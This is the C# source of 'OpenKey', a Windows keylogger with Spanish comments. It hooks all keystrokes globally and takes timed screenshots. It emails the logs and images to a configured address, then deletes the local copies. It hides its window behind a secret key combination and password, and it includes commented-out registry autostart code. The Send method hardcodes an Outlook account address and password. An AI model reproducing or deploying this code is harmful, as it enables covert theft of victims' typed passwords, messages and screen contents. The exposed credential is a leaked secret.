using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Windows.Forms;
using Microsoft.Win32;
using OpenKey.Properties;

namespace OpenKey
{
    public partial class Openkey : Form
    {
        public Openkey()
        {
            InitializeComponent();
        }
        GlobalKeyboardHook _gHook;
        private bool _isAltDown;
        private bool _isControlDown;
        private bool _isShiftDown;
        private bool _isFsDown;
        private bool _isHide;
        private bool _isLoad;
        private bool _isHook;
        RegistryKey _reg;
        string _dir;
        private string _space = "";
        //mail attr
        private MailMessage _mail;
        private Attachment _data;
        //Cronometro
        private int _hour;
        private int _min;
        private int _seg;
        //Repeat Keys Counters
        int _cEnter, _cDel, _cTab;
        //Pictureboxes
        List<PictureBox> _pics;
        private void openkey_Load(object sender, EventArgs e)
        {
            //Inicair con windows
            lbparar.Enabled = pararM.Enabled = unhook.Enabled = ocultarT.Enabled = lbocultar.Enabled = pichide.Enabled = false;
            //_reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
             //_reg.DeleteValue("OpenKey");
            //if (_reg != null && _reg.GetValue("OpenKey") == null)
          //  _reg.SetValue("OpenKey", Application.ExecutablePath);
            //Cargando valores por defecto del usuario
            Setting();
            log.Visible = false;
            //Iniciando instancias para el keylogger
            _gHook = new GlobalKeyboardHook();
            _gHook.KeyDown += gHook_KeyDown;
            _gHook.KeyUp += gHook_KeyUp;
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                _gHook.HookedKeys.Add(key);

            Opacity = Global.IsHide ? 0 : 1;

            Gallery();
        }

        public void Setting()
        {
            if (Global.Load())
            {
                _isLoad = true;
                Chks();
                if (Global.IsHook) Hide();
            }
            else _isLoad = false;
        }
        public void Chks()
        {
            if (Global.chksnaplocal)
            {
                Snapperlocal.Enabled = true;
                Snapperlocal.Interval = Global.Nudsnaplocal * 60000;
            }
            else Snapperlocal.Enabled = false;

            if (Global.chksnapshot)
            {
                Snapper.Enabled = true;
                Snapper.Interval = Global.NudSnap * 60000;
            }
            else Snapper.Enabled = false;

            if (Global.chksendmail)
            {
                Logger.Enabled = true;
                Logger.Interval = Global.NudLog * 60000;
            }
            else Logger.Enabled = false;

            if (Global.chkreglocal)
            {
                Regger.Enabled = true;
                Regger.Interval = Global.Nudreglocal * 60000;
            }
            else Regger.Enabled = false;
        }
        public void gHook_KeyUp(object sender, KeyEventArgs e)
        {
            if (log.Text != "") regs.Visible = false;
            else regs.Visible = true;
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = false;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = false;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = false;
                    break;
                case "F10":
                    _isFsDown = false;
                    break;
            }
        }

        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            var ch = (char)e.KeyValue;

            if (ch != '\b') _cDel = 0;
            if (ch != '\r') _cEnter = 0;
            switch (ch)
            {
                case '\b':
                    SmartExpression("Del>");
                    break;

                case '¾':
                    _space += '.';
                    break;
                case '½':
                    _space += '-';
                    break;

                case '¼':
                    _space += ',';
                    break;
                case '\t':
                    SmartExpression("Tab>");
                    break;
                case '¢':
                    //  <Alt Gr>
                    break;
                case 'y':
                    //  <Alt Gr>
                    break;
                case '¡':
                    //    space += "<Shif>";
                    break;
                case '¤':
                    //space += "<Alt>";
                    break;
                case '\r':
                    SmartExpression("Enter>");
                    break;
                case 'À':
                    _space += 'ñ';
                    break;

                case '£':
                    //  space += "<Control>";
                    break;

                case '»':
                    _space += '+';
                    break;

                case '¥':
                    //   space += "<Alt Gr>";
                    break;
                case '[':
                    _space += "<Windows>";
                    break;
                case ']':
                    _space += "<Menu>";
                    break;

                default:
                    _space += ch.ToString().ToLower();
                    break;
            }

            //Openeing
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    _isAltDown = true;
                    break;
                case "RControlKey":
                case "LControlKey":
                    _isControlDown = true;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    _isShiftDown = true;
                    break;
                case "F10":
                    _isFsDown = true;
                    break;
            }

            if (_isAltDown && _isControlDown && _isShiftDown && _isFsDown)
                if (_isHide)
                {
                    //Requiere Clave?
                    if (Global.chkkey)
                    {
                        if (new Login().ShowDialog() == DialogResult.OK)
                        {
                            Opacity = 1;
                            Show();
                            Global.IsHide = _isHide = false;
                            Global.Write();
                        }
                    }
                    else
                    {
                        Opacity = 1;
                        Show();
                        Global.IsHide = _isHide = false;
                        Global.Write();
                    }
                }
                else
                {
                    Hide();
                    Global.IsHide = _isHide = true;
                    Global.Write();
                }
            log.Text = _space;

        }
        private void openkey_FormClosing(object sender, FormClosingEventArgs e)
        {
            _gHook.unhook();
        }

        private void hook_Click_1(object sender, EventArgs e)
        {
            if (Global.chkkey)
            {
                if (new Login().ShowDialog() == DialogResult.OK)
                    Start();
            }
            else Start();
        }
        public void Start()
        {
            _gHook.hook();
            Chks();
            lbiniciar.Enabled = hook.Enabled = capturarM.Enabled = false;
            lbparar.Enabled = unhook.Enabled = pararM.Enabled = ocultarT.Enabled = lbocultar.Enabled = pichide.Enabled = true;
            Cronometro.Enabled = true;
            log.Visible = true;
            status.ForeColor = Color.Green;
            status.Text = Resources.StartCapture + _hour + ":" + _min + ":" + _seg;
            _isHook = true;
        }
        public void Stop()
        {
            _gHook.unhook();
            lbiniciar.Enabled = hook.Enabled = capturarM.Enabled = true;
            lbparar.Enabled = unhook.Enabled = pararM.Enabled = ocultarT.Enabled = lbocultar.Enabled = pichide.Enabled = false;
            status.ForeColor = Color.Red;
            Cronometro.Enabled = false;
            Regger.Enabled = false;
            Logger.Enabled = false;
            Snapper.Enabled = false;
            Snapperlocal.Enabled = false;

            status.Text = Resources.StopCapture + _hour + ":" + _min + ":" + _seg;
            _hour = _min = _seg = 0;
            _isHook = false;
        }

        private void unhook_Click(object sender, EventArgs e)
        {
            if (Global.chkkey)
            {
                if (new Login().ShowDialog() == DialogResult.OK)
                    Stop();
            }
            else Stop();
        }
        #region Eventos
        void Hoover(PictureBox pic)
        {
            pic.Size = new Size(90, 90);
        }

        new void Leave(PictureBox pic)
        {
            pic.Size = new Size(80, 80);
        }
        private void hook_MouseHover(object sender, EventArgs e)
        {
            lbiniciar.ForeColor = Color.DarkGreen;
            Hoover(hook);
        }

        private void unhook_MouseHover(object sender, EventArgs e)
        {
            lbparar.ForeColor = Color.DarkRed;
            Hoover(unhook);
        }

        private void ocultar_MouseHover(object sender, EventArgs e)
        {
            lbocultar.ForeColor = Color.CadetBlue;
            Hoover(pichide);
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            Leave(hook);
            lbiniciar.ForeColor = Color.DarkGray;
        }

        private void label2_MouseLeave(object sender, EventArgs e)
        {
            Leave(unhook);
            lbparar.ForeColor = Color.DarkGray;
        }

        private void ocultar_MouseLeave(object sender, EventArgs e)
        {
            Leave(pichide);
            lbocultar.ForeColor = Color.DarkGray;
        }

        private void hide_Click(object sender, EventArgs e)
        {
            Global.IsHide = true;
            if (_isHook) { Global.IsHook = _isHook; Global.Write(); }
            Hide();
        }

        private void exit_Click(object sender, EventArgs e)
        {

            Close();
        }

        private void opcionesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Global.chkkey)
            {
                if (new Login().ShowDialog() == DialogResult.OK)
                {
                    var options = new Opciones(_isLoad);
                    options.ShowDialog();
                    Chks();
                }
            }
            else
            {
                var options = new Opciones(_isLoad);
                options.ShowDialog();
                Chks();
            }
        }
        #endregion
        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void Regger_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Global.chkreglocal && _isHook)
                {
                    if (Global.Namereglocal.Trim() == "") Global.Namereglocal = "Reg " + DateTime.Now;
                    Global.Write(log.Text, Global.Namereglocal + "_" + Global.Creg + "." + Global.Formatreglocal, Global.Location);
                    Global.Creg++;
                    Global.Write();
                }
            }
            catch (Exception)
            {
                //
            }
        }
        private void Logger_Tick(object sender, EventArgs e)
        {
            try
            {
                if (_isHook)
                {
                    if (Global.Namereglocal.Trim() == "") Global.Namereglocal = "Reg";
                    Global.Write(log.Text, Global.Namereglocal + "_" + Global.Creg + "." + Global.Formatreglocal);
                    _dir = @"C:\\temp\\" + Global.Namereglocal + "_" + Global.Creg + "." + Global.Formatreglocal;
                    if (Global.radiorigen1)
                        Send("Registro de teclas " + DateTime.Now, _dir);
                    else Send("Registro de teclas", _dir, Global.Email, Global.Pass, Global.Smtp, int.Parse(Global.Port), Global.SSL);

                    _mail.Dispose();
                    var fi = new FileInfo(_dir);
                    fi.Delete();
                    log.Text = "";
                    Global.Creg++;
                    Global.Write();
                }
            }
            catch { }
        }

        private void Snapper_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Global.FormatSnap.Trim() == "") Global.FormatSnap = "jpg";
                Directory.CreateDirectory(Global.folder);
                SendKeys.Send("{PRTSC}");
                _dir = "c:\\temp\\" + Global.NameSnap + (new Random().Next(0, 999999)) + "_" + Global.Csnap + "." + Global.FormatSnap;
                Clipboard.GetImage().Save(_dir);

                if (Global.radiorigen1) Send("Snapshot " + DateTime.Now, _dir);
                else Send("Snapshot", _dir, Global.Email, Global.Pass, Global.Smtp, int.Parse(Global.Port), Global.SSL);

                _mail.Dispose();
                var fi = new FileInfo(_dir);
                fi.Delete();

                Global.Csnap++;
                Global.Write();
            }
            catch { }
        }
        /// <summary>
        /// Conviere una una tecla redundante en una más simple
        /// </summary>
        /// <param name="expression">Expresión a ser convertida, ejemplo: ALT></param>
        public void SmartExpression(string expression)
        {
            var chars = _space.ToCharArray();
            var match = expression.ToCharArray();
            var len1 = chars.Length;
            var len2 = match.Length;
            int i;
            var temp = _space;

            for (
             i = 0; i < len1 && i < len2; i++)
            {
                if (chars[len1 - 1 - i] != match[len2 - i - 1]) break;
            }

            if (i == len2)
            {
                for (i = len1 - 1; i >= 0; i--)
                {
                    if (chars[i] == '<')
                    {
                        switch (expression)
                        {
                            case "Del>":
                                _space += ++_cDel + "x " + expression;
                                break;
                            case "Enter>":
                                _space += ++_cEnter + "x " + expression;
                                break;
                            case "Tab>":
                                _space += ++_cTab + "x " + expression;
                                break;

                            //Se pueden agregar más cases con la la misma sintaxis de arriba
                        }
                        break;
                    }
                    _space = _space.Remove(_space.Length - 1);
                }
            }

            else _space += '<' + expression;
        }
        /// <summary>
        /// Envía un correo electrónico
        /// </summary>
        /// <param name="subject">Asunto</param>
        /// <param name="adjunt">Adjuntar</param>
        /// <param name="user">Correo</param>
        /// <param name="pass">Clave</param>
        /// <param name="smtp">Servidor smtp</param>
        /// <param name="port">puerto</param>
        /// <param name="ssl">Seguridad ssl?</param>
        public void Send(string subject, string adjunt = "", string user = "openkey-noreplay@outlook.com", string pass = "keyopen191", string smtp = "smtp.live.com", int port = 587, bool ssl = true)
        {
            try
            {
                if (Global.Destino.Trim() != "")
                {
                    _mail = new MailMessage();
                    _mail.To.Add(new MailAddress(Global.Destino));
                    _mail.From = new MailAddress(user);
                    _mail.Subject = "Openkey " + subject;
                    //mail.Body = log.Text;
                    _mail.IsBodyHtml = false;
                    if (adjunt.Trim() != "")
                    {
                        _data = new Attachment(adjunt, MediaTypeNames.Application.Octet);
                        _mail.Attachments.Add(_data);
                    }
                    var client = new SmtpClient(smtp, port);
                    using (client)
                    {
                        client.Credentials = new NetworkCredential(user, pass);
                        client.EnableSsl = ssl;
                        client.Send(_mail);
                    }
                }
            }
            catch { }
        }

        private void acercaDeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var about = new Acerca();
            about.ShowDialog();
        }
        private void Cronometro_Tick(object sender, EventArgs e)
        {
            _seg++;
            if (_seg == 60) { _min++; _seg = 0; }
            if (_min == 60) { _hour++; _min = 0; }
            if (_seg < 10)
                status.Text = Resources.StartCapture + _hour + ":" + _min + ":0" + _seg;
            else status.Text = Resources.StartCapture + _hour + ":" + _min + ":" + _seg;
        }

        private void openkey_Shown(object sender, EventArgs e)
        {

            if (Global.IsHide)
            {
                _isHook = _isHide = true;
                Start();
                Hide();
            }
        }

        private void verToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var ver = new Ver(_space);
            ver.ShowDialog();
        }

        private void salirToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void openkey_Deactivate(object sender, EventArgs e)
        {
        }

        private void openkey_Activated(object sender, EventArgs e)
        {
        }

        private void Snapperlocal_Tick(object sender, EventArgs e)
        {
            try
            {
                SendKeys.Send("{PRTSC}");
                Clipboard.GetImage().Save("c:\\temp\\Snapshot" + Global.Csnap + ".jpg");
                Global.Csnap++;
                Global.Write();
                Gallery();
            }
            catch { }
        }

        public void Gallery()
        {
            try
            {
                _pics = new List<PictureBox>();
                int col = 0, row = 0, picount = 0;
                for (var i = 0; i <= Global.Csnap; i++)
                {
                    if (File.Exists(@"C:\\temp\\Snapshot" + i + ".jpg"))
                    {
                        _pics.Add(new PictureBox());
                        _pics[picount].Image = Image.FromFile(@"C:\\temp\\Snapshot" + i + ".jpg");
                        Galeria.Controls.Add(_pics[picount]);
                        _pics[picount].Size = new Size(210, 120);

                        _pics[picount].Cursor = Cursors.Hand;
                        _pics[picount].Location = new Point(10 * col + _pics[picount].Size.Width * col, row * _pics[picount].Size.Height + 10 * row);
                        _pics[picount].Tag = i;
                        _pics[picount].SizeMode = PictureBoxSizeMode.StretchImage;
                        _pics[picount].Click += imagekey_Click;
                        col++; picount++;
                    }
                    if (col != 0 && col % 3 == 0)
                    {
                        col = 0;
                        row++;
                    }
                }
            }
            catch { }
        }

        void imagekey_Click(object sender, EventArgs e)
        {
            Process.Start(@"C:\\temp\\Snapshot" + ((PictureBox)sender).Tag + ".jpg");
        }
    }
}